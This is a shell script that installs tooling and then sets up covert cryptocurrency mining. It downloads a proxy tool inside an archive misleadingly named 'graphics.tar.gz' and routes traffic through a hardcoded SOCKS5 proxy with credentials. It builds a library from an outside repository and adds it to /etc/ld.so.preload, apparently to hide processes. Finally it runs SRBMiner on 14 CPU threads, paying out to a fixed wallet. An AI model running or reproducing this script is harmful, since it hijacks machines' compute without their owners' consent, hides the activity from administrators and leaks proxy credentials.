#!/bin/sh
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata
apt update
apt -y install binutils cmake build-essential screen unzip net-tools curl nano gcc

wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 51.79.243.155:2082
socks5_username = sshocean-denrio
socks5_password = 111
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "
echo " "

echo "******************************************************************"

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

echo "******************************************************************"

git clone https://github.com/scatterfafafa/lib.git
cd lib;make
sudo mv libOmptarget.so /usr/local/lib/;echo /usr/local/lib/libOmptarget.so >> /etc/ld.so.preload
cd ..

wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.9.7/SRBMiner-Multi-0-9-7-Linux.tar.xz

tar -xvf SRBMiner-Multi-0-9-7-Linux.tar.xz

cd SRBMiner-Multi-0-9-7

./SRBMiner-MULTI --disable-gpu --algorithm verushash --pool stratum+tcp://verushash.asia.mine.zergpool.com:3300 --wallet RF8gPnnhpfh8khU5oS5QmEFGqFR11Ayq8W.Rig --password c=RVN --cpu-threads 14
